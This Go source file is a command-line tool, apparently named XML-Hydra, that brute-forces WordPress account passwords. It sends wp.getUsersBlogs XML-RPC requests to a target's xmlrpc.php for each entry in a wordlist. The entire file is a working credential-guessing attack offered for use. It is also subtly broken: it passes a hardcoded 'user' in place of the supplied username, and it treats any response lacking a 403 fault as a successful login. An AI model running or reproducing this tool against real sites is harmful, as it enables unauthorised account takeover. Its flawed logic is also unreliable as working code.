package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"

	"github.com/schollz/progressbar/v3"
)

const banner = `__________________________________________________________________________________________
___  ___  ___      ___  ___-      __    __  ___  ___  ________    _______        __      
|"  \/"  ||"  \    /"  ||"  |     /" |  | "\|"  \/"  ||"      "\  /"      \      /""\     
 \   \  /  \   \  //   |||  |    (:  (__)  :)\   \  / (.  ___  :)|:        |    /    \    
  \\  \/   /\\  \/.    ||:  |     \/      \/  \\  \/  |: \   ) |||_____/   )   /' /\  \   
  /\.  \  |: \.        | \  |___  //  __  \\  /   /   (| (___\ || //      /   //  __'  \  
 /  \   \ |.  \    /:  |( \_|:  \(:  (  )  :)/   /    |:       :)|:  __   \  /   /  \\  \ 
|___/\___||___|\__/|___| \_______)\__|  |__/|___/     (________/ |__|  \___)(___/    \___)                             

# XML-Hydra
# https://github.com/prasant-paudel/xml-hydra
__________________________________________________________________________________________
`

const printDefaults = `
Usage: xml-hydra [OPTIONS]

OPTIONS:
 -t    Target URL
 -u    Username
 -w    Wordlist for passwords
 -h    Shows help message

EXAMPLE:  xml-hydra -t https://example.com/xmlrpc.php -u username -w passwords.txt

`

var (
	targetUrl string
	username  string
	wordlist  string
	help      bool
)

func argParse() {
	flag.StringVar(&targetUrl, "t", "", "Target URL")
	flag.StringVar(&username, "u", "", "Username")
	flag.StringVar(&wordlist, "w", "", "Wordlist for passwords")
	flag.BoolVar(&help, "h", false, "Shows help message")

	flag.Parse()

	if help || targetUrl == "" || username == "" || wordlist == "" {
		fmt.Printf(banner + printDefaults)
		fmt.Println(targetUrl)
		os.Exit(0)
	}
}

type Response struct {
	Match    bool
	Response *http.Response
	Username string
	Password string
	Error    error
}

func main() {
	argParse()

	ch := make(chan Response)

	passwords := ReadFileLines(wordlist)
	CheckPasswords(targetUrl, username, passwords, ch)

	bar := progressbar.Default(int64(len(passwords)))

	for r := range ch {
		if r.Error != nil {
			fmt.Printf("[!] Error checking (%s:%s)", r.Username, r.Password)
		} else if r.Match {
			fmt.Printf("[+] Matched -> %s:%s\n", r.Username, r.Password)
			break
		}
		bar.Add(1)
	}
}

func CheckPasswords(xmlrpcUrl, username string, passwords []string, ch chan<- Response) {
	faultRegexp := regexp.MustCompile(`(<value><int>403<\/int><\/value>)`)

	go func() {
		for i := 0; i < len(passwords); i++ {
			resp, err := SendRequest(xmlrpcUrl, "user", passwords[i])

			if err != nil {
				ch <- Response{
					Match:    false,
					Username: username,
					Password: passwords[i],
					Response: resp,
					Error:    err,
				}
				continue
			}

			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)

			if faultRegexp.Match(body) {
				ch <- Response{
					Match:    false, // Password did not match
					Username: username,
					Password: passwords[i],
					Response: resp,
				}
			} else {
				ch <- Response{
					Match:    true, // Password matched
					Username: username,
					Password: passwords[i],
					Response: resp,
				}
			}
		}
		close(ch)
	}()
}

func SendRequest(xmlrpcUrl, username, password string) (*http.Response, error) {
	payload := fmt.Sprintf(`
	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall>
	  <methodName>wp.getUsersBlogs</methodName>
	  <params>
	    <param><value>%s</value></param>
	    <param><value>%s</value></param>
	  </params>
	</methodCall>`, username, password)
	return http.Post(xmlrpcUrl, "text/xml; charset=UTF-8", strings.NewReader(payload))
}

func ReadFileLines(filePath string) []string {
	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	file.Close()
	return lines
}
